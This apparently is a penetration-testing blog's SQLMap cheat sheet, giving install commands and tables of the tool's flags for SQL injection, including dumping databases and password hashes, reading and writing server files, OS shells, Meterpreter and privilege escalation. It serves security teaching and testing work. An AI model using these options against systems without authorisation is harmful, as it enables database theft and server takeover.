---
layout: blog_item
title:  "SQLMap Cheat Sheet: Flags & Commands for SQL Injection"
date:   2024-02-11 14:37:10
author: Arr0way
description: 'SQLMap cheat sheet - Learn SQLMap with this Tutorial containing Flags, & SQLMap Command Examples.'
categories: [cheat-sheet]
tags:
- Web
- Tools
---


## What is SQLMap? 

SQLMap is a SQL Injection automation tool that is finds and exploits SQL Injection vulnerabilities. SQLMap has a number of functionality that can assist from fingerprinting to fully compromising a database and/or in some cases gaining shell level access to a server. If you do not have a current understanding of the fundamentals of how a SQL injection vulnerability occurs or is exploited, see our documentation on [what is SQL injection](/penetration-testing/web-app/sql-injection/) for an overview. 


<div class='note'><h2>TIP: How To Use SQLMap</h2>
<p>I personally use SQLMap as an exploitation tool, due to the large amount of resources and traffic the tool uses I personally find that detection is better done manually or using other detection tools such as Burp Suite scanner.</p> 
</div>

## How to use SQLMap 

SQLMap could be used within an automation system to detect and exploit SQL injection (SQLi) vulnerabilities in web applications, or as a SQLi exploitation tool to use after a proof of concept SQLi payload has been confirmed. 


<div class='note warning'><h2>WARNING: SQLMap Usage</h2>

<p>Depending on the configuration SQLMap can be very heavy on request sent to a web application, and may cause DoS conditions for webservers and cause an excessive amount of log files for the target.</p>
</div>

The more information you can give SQLMap the faster and less requests the tool will make, for example if you know the backend DBMS is MySQL and it is vulnerable to time based injection, then this could be provided to SQLMap using ```--dbms=mysql``` and ```–technique=T```. 


## How to Install SQLMap 

Install SQLMap via github: 

{% highlight bash %}

git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

{% endhighlight %}


## How to Update SQLMap 

How to update SQLMap: 

{% highlight bash %}

python sqlmap.py --update 

{% endhighlight %}

or cd into the github repo director and do: 

{% highlight bash %}

git pull 

{% endhighlight %}

* list element with functor item
{:toc}

## SQLMap Commands 

### SQLMap Options

Basic SQLMap command options:

<div class="mobile-side-scroller">
<table>
  <thead>
  <tr>
    <th>COMMAND</th>
    <th>DESCRIPTION</th>
  </tr>
  </thead>
  <tr>
    <td><p><code>-h, --help</code></p></td>
    <td><p>Show basic help message and exit</p></td>
  </tr>
  <tr>
    <td><p><code>-hh</code></p></td>
    <td><p>Show advanced help message and exit</p></td>
  </tr>
  <tr>
    <td><p><code>--version</code></p></td>
    <td><p>Show program's version number and exit</p></td>
  </tr>
  <tr>
    <td><p><code>-v VERBOSE</code></p></td>
    <td><p>Verbosity level: 0-6 (default 1)</p></td>
  </tr>
</table>
</div>

### SQLMap Target

SQLMap target command options:

<table>
<thead>
  <tr>
    <th>COMMAND</th>
    <th>DESCRIPTION</th>
  </tr>
</thead>
  <tr>
    <td><p><code>-u URL, --url=URL</code></p></td>
    <td><p>Target URL (e.g. "http://www.site.com/vuln.php?id=1")</p></td>
  </tr>
  <tr>
    <td><p><code>-d DIRECT</code></p></td>
    <td><p>Connection string for direct database connection</p></td>
  </tr>
  <tr>
    <td><p><code>-l LOGFILE</code></p></td>
    <td><p>Parse target(s) from Burp or WebScarab proxy log file</p></td>
  </tr>
  <tr>
    <td><p><code>-m BULKFILE</code></p></td>
    <td><p>Scan multiple targets given in a textual file</p></td>
  </tr>
  <tr>
    <td><p><code>-r REQUESTFILE</code></p></td>
    <td><p>Load HTTP request from a file</p></td>
  </tr>
  <tr>
    <td><p><code>-g GOOGLEDORK</code></p></td>
    <td><p>Process Google dork results as target URLs</p></td>
  </tr>
  <tr>
    <td><p><code>-c CONFIGFILE</code></p></td>
    <td><p>Load options from a configuration INI file</p></td>
  </tr>
</table>


### SQLMap Requests

SQLMap request command options:

<table>
<thead>
  <tr>
    <th>COMMAND</th>
    <th>DESCRIPTION</th>
  </tr>
</thead>
  <tr>
    <td><p><code>-A AGENT, --user..</code></p></td>
    <td><p>HTTP User-Agent header value</p></td>
  </tr>
  <tr>
    <td><p><code>-H HEADER, --hea..</code></p></td>
    <td><p>Extra header (e.g. "X-Forwarded-For: 127.0.0.1")</p></td>
  </tr>
  <tr>
    <td><p><code>--method=METHOD</code></p></td>
    <td><p>Force usage of given HTTP method (e.g. PUT)</p></td>
  </tr>
  <tr>
    <td><p><code>--data=DATA</code></p></td>
    <td><p>Data string to be sent through POST (e.g. "id=1")</p></td>
  </tr>
  <tr>
    <td><p><code>--param-del=PARA..</code></p></td>
    <td><p>Character used for splitting parameter values (e.g. &)</p></td>
  </tr>
  <tr>
    <td><p><code>--cookie=COOKIE</code></p></td>
    <td><p>HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")</p></td>
  </tr>
  <tr>
    <td><p><code>--cookie-del=COO..</code></p></td>
    <td><p>Character used for splitting cookie values (e.g. ;)</p></td>
  </tr>
  <tr>
    <td><p><code>--live-cookies=L..</code></p></td>
    <td><p>Live cookies file used for loading up-to-date values</p></td>
  </tr>
  <tr>
    <td><p><code>--load-cookies=L..</code></p></td>
    <td><p>File containing cookies in Netscape/wget format</p></td>
  </tr>
  <tr>
    <td><p><code>--drop-set-cookie</code></p></td>
    <td><p>Ignore Set-Cookie header from response</p></td>
  </tr>
  <tr>
    <td><p><code>--mobile</code></p></td>
    <td><p>Imitate smartphone through HTTP User-Agent header</p></td>
  </tr>
  <tr>
    <td><p><code>--random-agent</code></p></td>
    <td><p>Use randomly selected HTTP User-Agent header value</p></td>
  </tr>
  <tr>
    <td><p><code>--host=HOST</code></p></td>
    <td><p>HTTP Host header value</p></td>
  </tr>
  <tr>
    <td><p><code>--referer=REFERER</code></p></td>
    <td><p>HTTP Referer header value</p></td>
  </tr>
  <tr>
    <td><p><code>--headers=HEADERS</code></p></td>
    <td><p>Extra headers (e.g. "Accept-Language: fr\nETag: 123")</p></td>
  </tr>
  <tr>
    <td><p><code>--auth-type=AUTH..</code></p></td>
    <td><p>HTTP authentication type (Basic, Digest, NTLM or PKI)</p></td>
  </tr>
  <tr>
    <td><p><code>--auth-cred=AUTH..</code></p></td>
    <td><p>HTTP authentication credentials (name:password)</p></td>
  </tr>
  <tr>
    <td><p><code>--auth-file=AUTH..</code></p></td>
    <td><p>HTTP authentication PEM cert/private key file</p></td>
  </tr>
  <tr>
    <td><p><code>--ignore-code=IG..</code></p></td>
    <td><p>Ignore (problematic) HTTP error code (e.g. 401)</p></td>
  </tr>
  <tr>
    <td><p><code>--ignore-proxy</code></p></td>
    <td><p>Ignore system default proxy settings</p></td>
  </tr>
  <tr>
    <td><p><code>--ignore-redirects</code></p></td>
    <td><p>Ignore redirection attempts</p></td>
  </tr>
  <tr>
    <td><p><code>--ignore-timeouts</code></p></td>
    <td><p>Ignore connection timeouts</p></td>
  </tr>
  <tr>
    <td><p><code>--proxy=PROXY</code></p></td>
    <td><p>Use a proxy to connect to the target URL</p></td>
  </tr>
  <tr>
    <td><p><code>--proxy-cred=PRO..</code></p></td>
    <td><p>Proxy authentication credentials (name:password)</p></td>
  </tr>
  <tr>
    <td><p><code>--proxy-file=PRO..</code></p></td>
    <td><p>Load proxy list from a file</p></td>
  </tr>
  <tr>
    <td><p><code>--proxy-freq=PRO..</code></p></td>
    <td><p>Requests between change of proxy from a given list</p></td>
  </tr>
  <tr>
    <td><p><code>--tor</code></p></td>
    <td><p>Use Tor anonymity network</p></td>
  </tr>
  <tr>
    <td><p><code>--tor-port=TORPORT</code></p></td>
    <td><p>Set Tor proxy port other than default</p></td>
  </tr>
  <tr>
    <td><p><code>--tor-type=TORTYPE</code></p></td>
    <td><p>Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))</p></td>
  </tr>
  <tr>
    <td><p><code>--check-tor</code></p></td>
    <td><p>Check to see if Tor is used properly</p></td>
  </tr>
  <tr>
    <td><p><code>--delay=DELAY</code></p></td>
    <td><p>Delay in seconds between each HTTP request</p></td>
  </tr>
  <tr>
    <td><p><code>--timeout=TIMEOUT</code></p></td>
    <td><p>Seconds to wait before timeout connection (default 30)</p></td>
  </tr>
  <tr>
    <td><p><code>--retries=RETRIES</code></p></td>
    <td><p>Retries when the connection timeouts (default 3)</p></td>
  </tr>
  <tr>
    <td><p><code>--randomize=RPARAM</code></p></td>
    <td><p>Randomly change value for given parameter(s)</p></td>
  </tr>
  <tr>
    <td><p><code>--safe-url=SAFEURL</code></p></td>
    <td><p>URL address to visit frequently during testing</p></td>
  </tr>
  <tr>
    <td><p><code>--safe-post=SAFE..</code></p></td>
    <td><p>POST data to send to a safe URL</p></td>
  </tr>
  <tr>
    <td><p><code>--safe-req=SAFER..</code></p></td>
    <td><p>Load safe HTTP request from a file</p></td>
  </tr>
  <tr>
    <td><p><code>--safe-freq=SAFE..</code></p></td>
    <td><p>Regular requests between visits to a safe URL</p></td>
  </tr>
  <tr>
    <td><p><code>--skip-urlencode</code></p></td>
    <td><p>Skip URL encoding of payload data</p></td>
  </tr>
  <tr>
    <td><p><code>--csrf-token=CSR..</code></p></td>
    <td><p>Parameter used to hold anti-CSRF token</p></td>
  </tr>
  <tr>
    <td><p><code>--csrf-url=CSRFURL</code></p></td>
    <td><p>URL address to visit for extraction of anti-CSRF token</p></td>
  </tr>
  <tr>
    <td><p><code>--csrf-method=CS..</code></p></td>
    <td><p>HTTP method to use during anti-CSRF token page visit</p></td>
  </tr>
  <tr>
    <td><p><code>--csrf-retries=C..</code></p></td>
    <td><p>Retries for anti-CSRF token retrieval (default 0)</p></td>
  </tr>
  <tr>
    <td><p><code>--force-ssl</code></p></td>
    <td><p>Force usage of SSL/HTTPS</p></td>
  </tr>
  <tr>
    <td><p><code>--chunked</code></p></td>
    <td><p>Use HTTP chunked transfer encoded (POST) requests</p></td>
  </tr>
  <tr>
    <td><p><code>--hpp</code></p></td>
    <td><p>Use HTTP parameter pollution method</p></td>
  </tr>
  <tr>
    <td><p><code>--eval=EVALCODE</code></p></td>
    <td><p>Evaluate provided Python code before the request (e.g. "import hashlib;id2=hashlib.md5(id).hexdigest()")</p></td>
  </tr>
</table>


### SQLMap Optimisation 

SQLMap optimisation command options:

<table>
<thead>
  <tr>
    <th>COMMAND</th>
    <th>DESCRIPTION</th>
  </tr>
</thead>
  <tr>
    <td><p><code>-o</code></p></td>
    <td><p>Turn on all optimization switches</p></td>
  </tr>
  <tr>
    <td><p><code>--predict-output</code></p></td>
    <td><p>Predict common queries output</p></td>
  </tr>
  <tr>
    <td><p><code>--keep-alive</code></p></td>
    <td><p>Use persistent HTTP(s) connections</p></td>
  </tr>
  <tr>
    <td><p><code>--null-connection</code></p></td>
    <td><p>Retrieve page length without actual HTTP response body</p></td>
  </tr>
  <tr>
    <td><p><code>--threads=THREADS</code></p></td>
    <td><p>Max number of concurrent HTTP(s) requests (default 1)</p></td>
  </tr>
</table>


### SQLMap Injection 

SQLMap injection command options:

<table>
<thead>
  <tr>
    <th>COMMAND</th>
    <th>DESCRIPTION</th>
  </tr>
</thead>
  <tr>
    <td><p><code>-p TESTPARAMETER</code></p></td>
    <td><p>Testable parameter(s)</p></td>
  </tr>
  <tr>
    <td><p><code>--skip=SKIP</code></p></td>
    <td><p>Skip testing for given parameter(s)</p></td>
  </tr>
  <tr>
    <td><p><code>--skip-static</code></p></td>
    <td><p>Skip testing parameters that not appear to be dynamic</p></td>
  </tr>
  <tr>
    <td><p><code>--param-exclude=..</code></p></td>
    <td><p>Regexp to exclude parameters from testing (e.g. "ses")</p></td>
  </tr>
  <tr>
    <td><p><code>--param-filter=P..</code></p></td>
    <td><p>Select testable parameter(s) by place (e.g. "POST")</p></td>
  </tr>
  <tr>
    <td><p><code>--dbms=DBMS</code></p></td>
    <td><p>Force back-end DBMS to provided value</p></td>
  </tr>
  <tr>
    <td><p><code>--dbms-cred=DBMS..</code></p></td>
    <td><p>DBMS authentication credentials (user:password)</p></td>
  </tr>
  <tr>
    <td><p><code>--os=OS</code></p></td>
    <td><p>Force back-end DBMS operating system to provided value</p></td>
  </tr>
  <tr>
    <td><p><code>--invalid-bignum</code></p></td>
    <td><p>Use big numbers for invalidating values</p></td>
  </tr>
  <tr>
    <td><p><code>--invalid-logical</code></p></td>
    <td><p>Use logical operations for invalidating values</p></td>
  </tr>
  <tr>
    <td><p><code>--invalid-string</code></p></td>
    <td><p>Use random strings for invalidating values</p></td>
  </tr>
  <tr>
    <td><p><code>--no-cast</code></p></td>
    <td><p>Turn off payload casting mechanism</p></td>
  </tr>
  <tr>
    <td><p><code>--no-escape</code></p></td>
    <td><p>Turn off string escaping mechanism</p></td>
  </tr>
  <tr>
    <td><p><code>--prefix=PREFIX</code></p></td>
    <td><p>Injection payload prefix string</p></td>
  </tr>
  <tr>
    <td><p><code>--suffix=SUFFIX</code></p></td>
    <td><p>Injection payload suffix string</p></td>
  </tr>
  <tr>
    <td><p><code>--tamper=TAMPER</code></p></td>
    <td><p>Use given script(s) for tampering injection data</p></td>
  </tr>
</table>


### SQLMap Detection 

SQLMap detection command options:

<table>
<thead>
  <tr>
    <th>COMMAND</th>
    <th>DESCRIPTION</th>
  </tr>
</thead>
  <tr>
    <td><p><code>--level=LEVEL</code></p></td>
    <td><p>Level of tests to perform (1-5, default 1)</p></td>
  </tr>
  <tr>
    <td><p><code>--risk=RISK</code></p></td>
    <td><p>Risk of tests to perform (1-3, default 1)</p></td>
  </tr>
  <tr>
    <td><p><code>--string=STRING</code></p></td>
    <td><p>String to match when query is evaluated to True</p></td>
  </tr>
  <tr>
    <td><p><code>--not-string=NOT..</code></p></td>
    <td><p>String to match when query is evaluated to False</p></td>
  </tr>
  <tr>
    <td><p><code>--regexp=REGEXP</code></p></td>
    <td><p>Regexp to match when query is evaluated to True</p></td>
  </tr>
  <tr>
    <td><p><code>--code=CODE</code></p></td>
    <td><p>HTTP code to match when query is evaluated to True</p></td>
  </tr>
  <tr>
    <td><p><code>--smart</code></p></td>
    <td><p>Perform thorough tests only if positive heuristic(s)</p></td>
  </tr>
  <tr>
    <td><p><code>--text-only</code></p></td>
    <td><p>Compare pages based only on the textual content</p></td>
  </tr>
  <tr>
    <td><p><code>--titles</code></p></td>
    <td><p>Compare pages based only on their titles</p></td>
  </tr>
</table>


### SQLMap Techniques 

SQLMap technique command options:

<table>
<thead>
  <tr>
    <th>COMMAND</th>
    <th>DESCRIPTION</th>
  </tr>
</thead>
  <tr>
    <td><p><code>--technique=TECH..</code></p></td>
    <td><p>SQL injection techniques to use (default "BEUSTQ")</p></td>
  </tr>
  <tr>
    <td><p><code>--time-sec=TIMESEC</code></p></td>
    <td><p>Seconds to delay the DBMS response (default 5)</p></td>
  </tr>
  <tr>
    <td><p><code>--union-cols=UCOLS</code></p></td>
    <td><p>Range of columns to test for UNION query SQL injection</p></td>
  </tr>
  <tr>
    <td><p><code>--union-char=UCHAR</code></p></td>
    <td><p>Character to use for bruteforcing number of columns</p></td>
  </tr>
  <tr>
    <td><p><code>--union-from=UFROM</code></p></td>
    <td><p>Table to use in FROM part of UNION query SQL injection</p></td>
  </tr>
  <tr>
    <td><p><code>--dns-domain=DNS..</code></p></td>
    <td><p>Domain name used for DNS exfiltration attack</p></td>
  </tr>
  <tr>
    <td><p><code>--second-url=SEC..</code></p></td>
    <td><p>Resulting page URL searched for second-order response</p></td>
  </tr>
  <tr>
    <td><p><code>--second-req=SEC..</code></p></td>
    <td><p>Load second-order HTTP request from file</p></td>
  </tr>
</table>


### SQLMap Fingerprinting 

SQLMap fingerprint command options:

<table>
<thead>
  <tr>
    <th>COMMAND</th>
    <th>DESCRIPTION</th>
  </tr>
</thead>
  <tr>
    <td><p><code>-f, --fingerprint</code></p></td>
    <td><p>Perform an extensive DBMS version fingerprint</p></td>
  </tr>
</table>



### SQLMap Enumeration 

SQLMap enumeration command options:

<table>
<thead>
  <tr>
    <th>COMMAND</th>
    <th>DESCRIPTION</th>
  </tr>
</thead>
  <tr>
    <td><p><code>-a, --all</code></p></td>
    <td><p>Retrieve everything</p></td>
  </tr>
  <tr>
    <td><p><code>-b, --banner</code></p></td>
    <td><p>Retrieve DBMS banner</p></td>
  </tr>
  <tr>
    <td><p><code>--current-user</code></p></td>
    <td><p>Retrieve DBMS current user</p></td>
  </tr>
  <tr>
    <td><p><code>--current-db</code></p></td>
    <td><p>Retrieve DBMS current database</p></td>
  </tr>
  <tr>
    <td><p><code>--hostname</code></p></td>
    <td><p>Retrieve DBMS server hostname</p></td>
  </tr>
  <tr>
    <td><p><code>--is-dba</code></p></td>
    <td><p>Detect if the DBMS current user is DBA</p></td>
  </tr>
  <tr>
    <td><p><code>--users</code></p></td>
    <td><p>Enumerate DBMS users</p></td>
  </tr>
  <tr>
    <td><p><code>--passwords</code></p></td>
    <td><p>Enumerate DBMS users password hashes</p></td>
  </tr>
  <tr>
    <td><p><code>--privileges</code></p></td>
    <td><p>Enumerate DBMS users privileges</p></td>
  </tr>
  <tr>
    <td><p><code>--roles</code></p></td>
    <td><p>Enumerate DBMS users roles</p></td>
  </tr>
  <tr>
    <td><p><code>--dbs</code></p></td>
    <td><p>Enumerate DBMS databases</p></td>
  </tr>
  <tr>
    <td><p><code>--tables</code></p></td>
    <td><p>Enumerate DBMS database tables</p></td>
  </tr>
  <tr>
    <td><p><code>--columns</code></p></td>
    <td><p>Enumerate DBMS database table columns</p></td>
  </tr>
  <tr>
    <td><p><code>--schema</code></p></td>
    <td><p>Enumerate DBMS schema</p></td>
  </tr>
  <tr>
    <td><p><code>--count</code></p></td>
    <td><p>Retrieve number of entries for table(s)</p></td>
  </tr>
  <tr>
    <td><p><code>--dump</code></p></td>
    <td><p>Dump DBMS database table entries</p></td>
  </tr>
  <tr>
    <td><p><code>--dump-all</code></p></td>
    <td><p>Dump all DBMS databases tables entries</p></td>
  </tr>
  <tr>
    <td><p><code>--search</code></p></td>
    <td><p>Search column(s), table(s) and/or database name(s)</p></td>
  </tr>
  <tr>
    <td><p><code>--comments</code></p></td>
    <td><p>Check for DBMS comments during enumeration</p></td>
  </tr>
  <tr>
    <td><p><code>--statements</code></p></td>
    <td><p>Retrieve SQL statements being run on DBMS</p></td>
  </tr>
  <tr>
    <td><p><code>-D DB</code></p></td>
    <td><p>DBMS database to enumerate</p></td>
  </tr>
  <tr>
    <td><p><code>-T TBL</code></p></td>
    <td><p>DBMS database table(s) to enumerate</p></td>
  </tr>
  <tr>
    <td><p><code>-C COL</code></p></td>
    <td><p>DBMS database table column(s) to enumerate</p></td>
  </tr>
  <tr>
    <td><p><code>-X EXCLUDE</code></p></td>
    <td><p>DBMS database identifier(s) to not enumerate</p></td>
  </tr>
  <tr>
    <td><p><code>-U USER</code></p></td>
    <td><p>DBMS user to enumerate</p></td>
  </tr>
  <tr>
    <td><p><code>--exclude-sysdbs</code></p></td>
    <td><p>Exclude DBMS system databases when enumerating tables</p></td>
  </tr>
  <tr>
    <td><p><code>--pivot-column=P..</code></p></td>
    <td><p>Pivot column name</p></td>
  </tr>
  <tr>
    <td><p><code>--where=DUMPWHERE</code></p></td>
    <td><p>Use WHERE condition while table dumping</p></td>
  </tr>
  <tr>
    <td><p><code>--start=LIMITSTART</code></p></td>
    <td><p>First dump table entry to retrieve</p></td>
  </tr>
  <tr>
    <td><p><code>--stop=LIMITSTOP</code></p></td>
    <td><p>Last dump table entry to retrieve</p></td>
  </tr>
  <tr>
    <td><p><code>--first=FIRSTCHAR</code></p></td>
    <td><p>First query output word character to retrieve</p></td>
  </tr>
  <tr>
    <td><p><code>--last=LASTCHAR</code></p></td>
    <td><p>Last query output word character to retrieve</p></td>
  </tr>
  <tr>
    <td><p><code>--sql-query=SQLQ..</code></p></td>
    <td><p>SQL statement to be executed</p></td>
  </tr>
  <tr>
    <td><p><code>--sql-shell</code></p></td>
    <td><p>Prompt for an interactive SQL shell</p></td>
  </tr>
  <tr>
    <td><p><code>--sql-file=SQLFILE</code></p></td>
    <td><p>Execute SQL statements from given file(s)</p></td>
  </tr>
</table>


### SQLMap Brute Force 

SQLMap brute force command options:

<table>
<thead>
  <tr>
    <th>COMMAND</th>
    <th>DESCRIPTION</th>
  </tr>
</thead>
  <tr>
    <td><p><code>--common-tables</code></p></td>
    <td><p>Check existence of common tables</p></td>
  </tr>
  <tr>
    <td><p><code>--common-columns</code></p></td>
    <td><p>Check existence of common columns</p></td>
  </tr>
  <tr>
    <td><p><code>--common-files</code></p></td>
    <td><p>Check existence of common files</p></td>
  </tr>
</table>


### SQLMap Custom User Defined Options 

SQLMap custom command options:

<table>
<thead>
  <tr>
    <th>COMMAND</th>
    <th>DESCRIPTION</th>
  </tr>
</thead>
  <tr>
    <td><p><code>--udf-inject</code></p></td>
    <td><p>Inject custom user-defined functions</p></td>
  </tr>
  <tr>
    <td><p><code>--shared-lib=SHLIB</code></p></td>
    <td><p>Local path of the shared library</p></td>
  </tr>
</table>



### SQLMap File System Options 

SQLMap file system command options, e.g., how to read a file from the command line using SQLMap:

<table>
<thead>
  <tr>
    <th>COMMAND</th>
    <th>DESCRIPTION</th>
  </tr>
</thead>
  <tr>
    <td><p><code>--file-read=FILE..</code></p></td>
    <td><p>Read a file from the back-end DBMS file system</p></td>
  </tr>
  <tr>
    <td><p><code>--file-write=FILE..</code></p></td>
    <td><p>Write a local file on the back-end DBMS file system</p></td>
  </tr>
  <tr>
    <td><p><code>--file-dest=FILE..</code></p></td>
    <td><p>Back-end DBMS absolute filepath to write to</p></td>
  </tr>
</table>



### SQLMap Operating System Access 

SQLMap OS command options, e.g., how to gain a shell via SQLMap:

<table>
<thead>
  <tr>
    <th>COMMAND</th>
    <th>DESCRIPTION</th>
  </tr>
</thead>
  <tr>
    <td><p><code>--os-cmd=OSCMD</code></p></td>
    <td><p>Execute an operating system command</p></td>
  </tr>
  <tr>
    <td><p><code>--os-shell</code></p></td>
    <td><p>Prompt for an interactive operating system shell</p></td>
  </tr>
  <tr>
    <td><p><code>--os-pwn</code></p></td>
    <td><p>Prompt for an OOB shell, Meterpreter or VNC</p></td>
  </tr>
  <tr>
    <td><p><code>--os-smbrelay</code></p></td>
    <td><p>One click prompt for an OOB shell, Meterpreter or VNC</p></td>
  </tr>
  <tr>
    <td><p><code>--os-bof</code></p></td>
    <td><p>Stored procedure buffer overflow exploitation</p></td>
  </tr>
  <tr>
    <td><p><code>--priv-esc</code></p></td>
    <td><p>Database process user privilege escalation</p></td>
  </tr>
  <tr>
    <td><p><code>--msf-path=MSFPATH</code></p></td>
    <td><p>Local path where Metasploit Framework is installed</p></td>
  </tr>
  <tr>
    <td><p><code>--tmp-path=TMPPATH</code></p></td>
    <td><p>Remote absolute path of temporary files directory</p></td>
  </tr>
</table>


### SQLMap Windows Registry Access 


<table>
<thead>
  <tr>
    <th>COMMAND</th>
    <th>DESCRIPTION</th>
  </tr>
</thead>
  <tr>
    <td><p><code>--reg-read</code></p></td>
    <td><p>Read a Windows registry key value</p></td>
  </tr>
  <tr>
    <td><p><code>--reg-add</code></p></td>
    <td><p>Write a Windows registry key value data</p></td>
  </tr>
  <tr>
    <td><p><code>--reg-del</code></p></td>
    <td><p>Delete a Windows registry key value</p></td>
  </tr>
  <tr>
    <td><p><code>--reg-key=REGKEY</code></p></td>
    <td><p>Windows registry key</p></td>
  </tr>
  <tr>
    <td><p><code>--reg-value=REGVAL</code></p></td>
    <td><p>Windows registry key value</p></td>
  </tr>
  <tr>
    <td><p><code>--reg-data=REGDATA</code></p></td>
    <td><p>Windows registry key value data</p></td>
  </tr>
  <tr>
    <td><p><code>--reg-type=REGTYPE</code></p></td>
    <td><p>Windows registry key value type</p></td>
  </tr>
</table>


### General SQLMap Commands 

SQLMap general command options:

<table>
<thead>
  <tr>
    <th>COMMAND</th>
    <th>DESCRIPTION</th>
  </tr>
</thead>
  <tr>
    <td><p><code>-s SESSIONFILE</code></p></td>
    <td><p>Load session from a stored (.sqlite) file</p></td>
  </tr>
  <tr>
    <td><p><code>-t TRAFFICFILE</code></p></td>
    <td><p>Log all HTTP traffic into a textual file</p></td>
  </tr>
  <tr>
    <td><p><code>--answers=ANSWERS</code></p></td>
    <td><p>Set predefined answers (e.g. "quit=N,follow=N")</p></td>
  </tr>
  <tr>
    <td><p><code>--base64=BASE64PARAMS</code></p></td>
    <td><p>Parameter(s) containing Base64 encoded data</p></td>
  </tr>
  <tr>
    <td><p><code>--base64-safe</code></p></td>
    <td><p>Use URL and filename safe Base64 alphabet (RFC 4648)</p></td>
  </tr>
  <tr>
    <td><p><code>--batch</code></p></td>
    <td><p>Never ask for user input, use the default behavior</p></td>
  </tr>
  <tr>
    <td><p><code>--binary-fields=BINARYFIELDS</code></p></td>
    <td><p>Result fields having binary values (e.g. "digest")</p></td>
  </tr>
  <tr>
    <td><p><code>--check-internet</code></p></td>
    <td><p>Check Internet connection before assessing the target</p></td>
  </tr>
  <tr>
    <td><p><code>--cleanup</code></p></td>
    <td><p>Clean up the DBMS from sqlmap specific UDF and tables</p></td>
  </tr>
  <tr>
    <td><p><code>--crawl=CRAWLDEPTH</code></p></td>
    <td><p>Crawl the website starting from the target URL</p></td>
  </tr>
  <tr>
    <td><p><code>--crawl-exclude=CRAWLEXCLUDE</code></p></td>
    <td><p>Regexp to exclude pages from crawling (e.g. "logout")</p></td>
  </tr>
  <tr>
    <td><p><code>--csv-del=CSVDEL</code></p></td>
    <td><p>Delimiting character used in CSV output (default ",")</p></td>
  </tr>
  <tr>
    <td><p><code>--charset=CHARSET</code></p></td>
    <td><p>Blind SQL injection charset (e.g. "0123456789abcdef")</p></td>
  </tr>
  <tr>
    <td><p><code>--dump-format=DUMPFORMAT</code></p></td>
    <td><p>Format of dumped data (CSV (default), HTML or SQLITE)</p></td>
  </tr>
  <tr>
    <td><p><code>--encoding=ENCODING</code></p></td>
    <td><p>Character encoding used for data retrieval (e.g. GBK)</p></td>
  </tr>
  <tr>
    <td><p><code>--eta</code></p></td>
    <td><p>Display for each output the estimated time of arrival</p></td>
  </tr>
  <tr>
    <td><p><code>--flush-session</code></p></td>
    <td><p>Flush session files for current target</p></td>
  </tr>
  <tr>
    <td><p><code>--forms</code></p></td>
    <td><p>Parse and test forms on target URL</p></td>
  </tr>
  <tr>
    <td><p><code>--fresh-queries</code></p></td>
    <td><p>Ignore query results stored in session file</p></td>
  </tr>
  <tr>
    <td><p><code>--gpage=GOOGLEPAGE</code></p></td>
    <td><p>Use Google dork results from specified page number</p></td>
  </tr>
  <tr>
    <td><p><code>--har=HARFILE</code></p></td>
    <td><p>Log all HTTP traffic into a HAR file</p></td>
  </tr>
  <tr>
    <td><p><code>--hex</code></p></td>
    <td><p>Use hex conversion during data retrieval</p></td>
  </tr>
  <tr>
    <td><p><code>--output-dir=OUTPUTDIR</code></p></td>
    <td><p>Custom output directory path</p></td>
  </tr>
  <tr>
    <td><p><code>--parse-errors</code></p></td>
    <td><p>Parse and display DBMS error messages from responses</p></td>
  </tr>
  <tr>
    <td><p><code>--preprocess=PREPROCESS</code></p></td>
    <td><p>Use given script(s) for preprocessing (request)</p></td>
  </tr>
  <tr>
    <td><p><code>--postprocess=POSTPROCESS</code></p></td>
    <td><p>Use given script(s) for postprocessing (response)</p></td>
  </tr>
  <tr>
    <td><p><code>--repair</code></p></td>
    <td><p>Redump entries having unknown character marker (?)</p></td>
  </tr>
  <tr>
    <td><p><code>--save=SAVECONFIG</code></p></td>
    <td><p>Save options to a configuration INI file</p></td>
  </tr>
  <tr>
    <td><p><code>--scope=SCOPE</code></p></td>
    <td><p>Regexp for filtering targets</p></td>
  </tr>
  <tr>
    <td><p><code>--skip-heuristics</code></p></td>
    <td><p>Skip heuristic detection of SQLi/XSS vulnerabilities</p></td>
  </tr>
  <tr>
    <td><p><code>--skip-waf</code></p></td>
    <td><p>Skip heuristic detection of WAF/IPS protection</p></td>
  </tr>
  <tr>
    <td><p><code>--table-prefix=TABLEPREFIX</code></p></td>
    <td><p>Prefix used for temporary tables (default: "sqlmap")</p></td>
  </tr>
  <tr>
    <td><p><code>--test-filter=TESTFILTER</code></p></td>
    <td><p>Select tests by payloads and/or titles (e.g. ROW)</p></td>
  </tr>
  <tr>
    <td><p><code>--test-skip=TESTSKIP</code></p></td>
    <td><p>Skip tests by payloads and/or titles (e.g. BENCHMARK)</p></td>
  </tr>
  <tr>
    <td><p><code>--web-root=WEBROOT</code></p></td>
    <td><p>Web server document root directory (e.g. "/var/www")</p></td>
  </tr>
</table>


### Misc SQLMap Commands 

SQLMap commands that don't fit into any other category :) 

<table>
<thead>
  <tr>
    <th>COMMAND</th>
    <th>DESCRIPTION</th>
  </tr>
</thead>
  <tr>
    <td><p><code>-z MNEMONICS</code></p></td>
    <td><p>Use short mnemonics (e.g. "flu,bat,ban,tec=EU")</p></td>
  </tr>
  <tr>
    <td><p><code>--alert=ALERT</code></p></td>
    <td><p>Run host OS command(s) when SQL injection is found</p></td>
  </tr>
  <tr>
    <td><p><code>--beep</code></p></td>
    <td><p>Beep on question and/or when SQLi/XSS/FI is found</p></td>
  </tr>
  <tr>
    <td><p><code>--dependencies</code></p></td>
    <td><p>Check for missing (optional) sqlmap dependencies</p></td>
  </tr>
  <tr>
    <td><p><code>--disable-coloring</code></p></td>
    <td><p>Disable console output coloring</p></td>
  </tr>
  <tr>
    <td><p><code>--list-tampers</code></p></td>
    <td><p>Display list of available tamper scripts</p></td>
  </tr>
  <tr>
    <td><p><code>--offline</code></p></td>
    <td><p>Work in offline mode (only use session data)</p></td>
  </tr>
  <tr>
    <td><p><code>--purge</code></p></td>
    <td><p>Safely remove all content from sqlmap data directory</p></td>
  </tr>
  <tr>
    <td><p><code>--results-file=RESULTSFILE</code></p></td>
    <td><p>Location of CSV results file in multiple targets mode</p></td>
  </tr>
  <tr>
    <td><p><code>--shell</code></p></td>
    <td><p>Prompt for an interactive sqlmap shell</p></td>
  </tr>
  <tr>
    <td><p><code>--tmp-dir=TMPDIR</code></p></td>
    <td><p>Local directory for storing temporary files</p></td>
  </tr>
  <tr>
    <td><p><code>--unstable</code></p></td>
    <td><p>Adjust options for unstable connections</p></td>
  </tr>
